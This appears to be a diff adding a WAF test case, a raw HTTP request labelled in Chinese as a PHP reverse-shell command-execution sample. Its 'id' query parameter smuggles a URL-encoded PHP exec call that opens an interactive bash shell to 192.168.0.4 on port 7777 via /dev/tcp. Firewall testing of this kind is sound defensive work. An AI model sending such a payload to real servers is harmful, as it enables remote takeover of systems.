@@ -1,0 +1,9 @@
+# 命令执行_反弹shell-06507070
+# PHP反弹shell
+GET /?id=php%20-r%20%20%27exec%28%22%2Fbin%2Fbash%20-i%20%3E&%20%2Fdev%2Ftcp%2F192.168.0.4%2F7777%22%29%27&bid=hd_tag_m8mv25ym HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25ym
+RM-PRO-Token: 5d6a9ab322440de14f4b66a537c107bf
+RM-PRO-Time: 1742808514291
+User-Agent: curl/7.83.1
+
